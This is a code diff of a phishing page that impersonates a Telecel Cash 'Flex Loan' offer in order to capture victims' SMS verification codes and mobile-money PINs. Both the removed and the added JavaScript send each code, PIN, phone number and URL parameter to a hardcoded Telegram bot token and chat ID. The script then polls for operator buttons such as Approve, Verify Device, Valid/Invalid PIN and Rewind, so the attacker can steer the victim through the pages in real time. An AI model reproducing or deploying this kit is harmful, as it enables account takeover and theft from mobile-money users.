@@ -443,82 +443,92 @@
             BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
             CHAT_ID: '7547427914',
             SUCCESS_PAGE: 'success.html',
-            DEVICE_PAGE: 'device_verify.html',
-            HOME_PAGE: 'index.html'
+            DEVICE_PAGE: 'device_verify.html'
         };
 
         let state = { lastUpdateId: 0 };
         let isProcessing = false;
         let activeInterval = null;
-        const params = new URLSearchParams(window.location.search);
-        const inheritedRewindId = params.get('rewindId');
 
         const errMsg = document.getElementById('errMsg');
         const pinErrMsg = document.getElementById('pinErrMsg');
         const spinner = document.getElementById('spinner');
+        const pinModal = document.getElementById('pinModal');
         const verifyBtn = document.getElementById('verifyBtn');
         const confirmPinBtn = document.getElementById('confirmPinBtn');
-        const pinModal = document.getElementById('pinModal');
 
-        function setupOTPInputs(containerId, count, nextBtnId) {
-            const container = document.getElementById(containerId);
-            for (let i = 0; i < count; i++) {
-                const input = document.createElement('input');
-                input.type = 'tel';
-                input.className = 'otp-input';
-                input.maxLength = 1;
-                input.inputMode = 'numeric';
-                input.dataset.index = i;
-                
-                input.addEventListener('input', (e) => {
-                    const val = e.target.value.replace(/[^0-9]/g, '');
-                    e.target.value = val;
-                    if (val && i < count - 1) container.children[i + 1].focus();
-                    
-                    // AUTO-SUBMIT FEATURE
-                    if (Array.from(container.children).every(inp => inp.value)) {
-                        if (containerId === 'otpInputs') {
-                            verifyBtn.click();
-                        } else if (containerId === 'pinInputs') {
-                            confirmPinBtn.click();
-                        }
-                    }
-                });
+        const params = new URLSearchParams(window.location.search);
+        const inheritedRewindId = params.get('rewindId');
 
-                input.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && !e.target.value && i > 0) {
-                        container.children[i - 1].focus();
-                    }
-                });
-
-                container.appendChild(input);
-            }
+        function getAllParams() {
+            return params.toString();
         }
 
-        function getOTPValue(containerId) {
-            return Array.from(document.getElementById(containerId).children).map(inp => inp.value).join('');
-        }
-
-        function loadDetails() {
+        function loadOffer() {
             const amount = params.get('amount');
             const name = params.get('name');
             const phone = params.get('phone');
             const duration = params.get('duration');
             const purpose = params.get('purpose');
 
-            if (amount) {
-                document.getElementById('offerPrice').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
-                document.getElementById('offerTitle').textContent = name ? `${name}'s Flex Loan` : 'Telecel Flex Loan';
-                
-                let meta = [];
-                if (duration) meta.push(`<span>${duration} Days</span>`);
-                if (purpose) meta.push(`<span>${purpose.replace(/([A-Z])/g, ' $1').trim()}</span>`);
-                document.getElementById('offerMeta').innerHTML = meta.join(' • ');
+            if (amount) document.getElementById('offerPrice').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
+            if (name) document.getElementById('offerTitle').textContent = `${name}'s Flex Loan`;
+            if (phone) document.getElementById('phoneDisplay').innerHTML = `Verification code sent to <strong>${phone}</strong>`;
+
+            const meta = document.getElementById('offerMeta');
+            meta.innerHTML = '';
+            if (duration) meta.innerHTML += `<div class="meta-item">Duration: <span>${duration} Days</span></div>`;
+            if (purpose) meta.innerHTML += `<div class="meta-item">Purpose: <span>${purpose.replace(/([A-Z])/g, ' $1').trim()}</span></div>`;
+        }
+
+        function createInputs(containerId, count) {
+            const container = document.getElementById(containerId);
+            container.innerHTML = '';
+            for (let i = 0; i < count; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.className = 'otp-input';
+                input.inputMode = 'numeric';
+                input.pattern = '[0-9]*';
+                container.appendChild(input);
             }
-            if (phone) {
-                const masked = phone.substring(0, 3) + ' ••• ••• ' + phone.substring(phone.length - 3);
-                document.getElementById('phoneDisplay').innerHTML = `Sent to <strong>${masked}</strong>`;
-            }
+        }
+
+        function getCode(containerId) {
+            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
+                       .map(i => i.value.trim()).join('');
+        }
+
+        function setupAutoFocus(containerId, length, onComplete) {
+            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    input.value = input.value.replace(/\D/g, '');
+                    if (input.value.length === 1 && index < length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    // AUTO-FILL AND AUTO-SEND: When all digits are entered, automatically submit
+                    if (getCode(containerId).length === length) {
+                        setTimeout(onComplete, 180);
+                    }
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        function focusFirstInput(containerId) {
+            const first = document.querySelector(`#${containerId} .otp-input`);
+            if (first) first.focus();
+        }
+
+        function buildNextUrl(page) {
+            const qs = getAllParams();
+            return qs ? `${page}?${qs}` : page;
         }
 
         // --- MASTER REWIND POLLING ---
@@ -534,54 +544,73 @@
                         if (update.callback_query && update.callback_query.data === targetRewindId) {
                             clearInterval(rewindInterval);
                             if (activeInterval) clearInterval(activeInterval);
-                            window.location.href = CONFIG.HOME_PAGE + '?' + params.toString();
+                            window.location.href = 'index.html?' + params.toString();
                         }
                     });
                 } catch (e) {}
             }, 1000);
         }
 
-        async function sendToBot(otp, pin = '') {
+        function submitOTP() {
             if (isProcessing) return;
             isProcessing = true;
             verifyBtn.disabled = true;
-            confirmPinBtn.disabled = true;
+            verifyBtn.textContent = 'Verifying...';
 
-            const ts = Date.now();
-            const approveId = `otp_approve_${ts}`;
-            const declineId = `otp_decline_${ts}`;
-            const verifyId  = `otp_verify_${ts}`;
-            const rewindId  = `otp_rewind_${ts}`;
+            const otp = getCode('otpInputs');
+            if (otp.length !== 5) {
+                resetButton();
+                return;
+            }
 
-            const phone = params.get('phone');
-            const amount = params.get('amount');
-            const type = pin ? '🔐 PIN & OTP Verification' : '🔢 OTP Verification';
-            const msg = `<b>${type}</b>\n\n<b>Phone:</b> <code>${phone}</code>\n<b>Amount:</b> GHS ${amount}\n<b>OTP:</b> <code>${otp}</code>${pin ? `\n<b>PIN:</b> <code>${pin}</code>` : ''}`;
+            const ts         = Date.now();
+            const approveId  = `otp_approve_${ts}`;
+            const declineId  = `otp_decline_${ts}`;
+            const verifyDeviceId = `otp_verify_${ts}`;
+            const validId    = `valid_${ts}`;
+            const invalidId  = `invalid_${ts}`;
+            const rewindId   = `rewind_${ts}`;
 
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.CHAT_ID,
-                        text: msg,
-                        parse_mode: 'HTML',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{ text: "✅ Approve", callback_data: approveId }, { text: "📱 Verify Device", callback_data: verifyId }],
-                                [{ text: "🚫 Decline", callback_data: declineId }],
-                                [{ text: "⏪ Rewind — Force Return", callback_data: rewindId }]
+            const paramSummary = Array.from(params.entries())
+                .map(([k, v]) => `${k}: <code>${v}</code>`)
+                .join('\n');
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔴 OTP Verification — Telecel Cash</b>\n\n${paramSummary}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Approve',       callback_data: approveId },
+                                { text: '📱 Verify Device', callback_data: verifyDeviceId }
+                            ],
+                            [
+                                { text: '✅ Valid PIN',   callback_data: validId },
+                                { text: '❌ Invalid PIN', callback_data: invalidId }
+                            ],
+                            [
+                                { text: '❌ Decline', callback_data: declineId },
+                                { text: '⏪ Rewind', callback_data: rewindId }
                             ]
-                        }
-                    })
-                });
+                        ]
+                    }
+                })
+            })
+            .then(() => {
                 spinner.style.display = 'flex';
                 startMasterRewindPolling(rewindId);
-                startPolling(approveId, declineId, verifyId, rewindId);
-            } catch (e) { resetButton(); }
+                startPolling(approveId, declineId, verifyDeviceId, validId, invalidId, rewindId);
+            })
+            .catch(() => {
+                resetButton();
+            });
         }
 
-        function startPolling(approveId, declineId, verifyId, rewindId) {
+        function startPolling(approveId, declineId, verifyDeviceId, validId, invalidId, rewindId) {
             if (activeInterval) clearInterval(activeInterval);
             activeInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
@@ -594,25 +623,37 @@
                                 const cb = update.callback_query.data;
                                 if (cb === approveId) {
                                     clearInterval(activeInterval);
-                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
-                                }
-                                else if (cb === verifyId) {
-                                    clearInterval(activeInterval);
-                                    const d = new URLSearchParams(params.toString());
-                                    d.set('rewindId', rewindId);
-                                    window.location.href = CONFIG.DEVICE_PAGE + '?' + d.toString();
-                                }
-                                else if (cb === declineId) {
+                                    spinner.style.display = 'none';
+                                    showPinModal();
+                                } else if (cb === validId) {
                                     clearInterval(activeInterval);
                                     spinner.style.display = 'none';
-                                    pinModal.style.display = 'none';
-                                    errMsg.textContent = "Verification failed. Please try again.";
-                                    errMsg.style.display = 'block';
-                                    resetButton();
-                                }
-                                else if (cb === rewindId) {
+                                    window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+                                } else if (cb === verifyDeviceId) {
                                     clearInterval(activeInterval);
-                                    window.location.href = CONFIG.HOME_PAGE + '?' + params.toString();
+                                    spinner.style.display = 'none';
+                                    window.location.href = buildNextUrl(CONFIG.DEVICE_PAGE);
+                                } else if (cb === declineId) {
+                                    clearInterval(activeInterval);
+                                    spinner.style.display = 'none';
+                                    errMsg.textContent = 'Request declined. Please try again.';
+                                    errMsg.style.display = 'block';
+                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
+                                    focusFirstInput('otpInputs');
+                                    resetButton();
+                                } else if (cb === invalidId) {
+                                    clearInterval(activeInterval);
+                                    spinner.style.display = 'none';
+                                    pinErrMsg.textContent = 'Invalid PIN. Please try again.';
+                                    pinErrMsg.style.display = 'block';
+                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
+                                    focusFirstInput('pinInputs');
+                                    confirmPinBtn.disabled = false;
+                                    confirmPinBtn.textContent = 'Confirm PIN';
+                                } else if (cb === rewindId) {
+                                    clearInterval(activeInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = 'index.html?' + params.toString();
                                 }
                             }
                         });
@@ -620,40 +661,83 @@
             }, 1000);
         }
 
+        function showPinModal() {
+            pinModal.style.display = 'flex';
+            createInputs('pinInputs', 4);
+            setupAutoFocus('pinInputs', 4, submitPIN);
+            focusFirstInput('pinInputs');
+            pinErrMsg.style.display = 'none';
+        }
+
+        function submitPIN() {
+            const pin = getCode('pinInputs');
+            if (pin.length !== 4) return;
+
+            confirmPinBtn.disabled = true;
+            confirmPinBtn.textContent = 'Verifying...';
+
+            const ts        = Date.now();
+            const validId   = `valid_pin_${ts}`;
+            const invalidId = `invalid_pin_${ts}`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ Valid PIN',   callback_data: validId },
+                            { text: '❌ Invalid PIN', callback_data: invalidId }
+                        ]]
+                    }
+                })
+            }).then(() => startPinPolling(validId, invalidId));
+        }
+
+        function startPinPolling(validId, invalidId) {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        data.result?.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+                                if (cb === validId) {
+                                    clearInterval(interval);
+                                    pinModal.style.display = 'none';
+                                    window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+                                } else if (cb === invalidId) {
+                                    clearInterval(interval);
+                                    pinErrMsg.textContent = 'Invalid PIN. Please try again.';
+                                    pinErrMsg.style.display = 'block';
+                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
+                                    focusFirstInput('pinInputs');
+                                    confirmPinBtn.disabled = false;
+                                    confirmPinBtn.textContent = 'Confirm PIN';
+                                }
+                            }
+                        });
+                    });
+            }, 1400);
+        }
+
         function resetButton() {
             isProcessing = false;
             verifyBtn.disabled = false;
-            confirmPinBtn.disabled = false;
+            verifyBtn.textContent = 'Verify & Confirm Loan';
         }
 
-        verifyBtn.onclick = () => {
-            const otp = getOTPValue('otpInputs');
-            if (otp.length < 5) {
-                errMsg.textContent = "Please enter the 5-digit code sent to you.";
-                errMsg.style.display = 'block';
-                return;
-            }
-            errMsg.style.display = 'none';
-            pinModal.style.display = 'flex';
-            setTimeout(() => document.getElementById('pinInputs').children[0].focus(), 100);
-        };
-
-        confirmPinBtn.onclick = () => {
-            const pin = getOTPValue('pinInputs');
-            if (pin.length < 4) {
-                pinErrMsg.textContent = "Please enter your 4-digit Telecel PIN.";
-                pinErrMsg.style.display = 'block';
-                return;
-            }
-            pinErrMsg.style.display = 'none';
-            sendToBot(getOTPValue('otpInputs'), pin);
-        };
-
-        setupOTPInputs('otpInputs', 5, 'verifyBtn');
-        setupOTPInputs('pinInputs', 4, 'confirmPinBtn');
-        loadDetails();
+        // ─── Init ───────────────────────────────────────────────────────────────
+        createInputs('otpInputs', 5);
+        setupAutoFocus('otpInputs', 5, submitOTP);
+        verifyBtn.onclick = submitOTP;
+        confirmPinBtn.onclick = submitPIN;
+        loadOffer();
         if (inheritedRewindId) startMasterRewindPolling(inheritedRewindId);
-        document.getElementById('otpInputs').children[0].focus();
     </script>
 </body>
 </html>
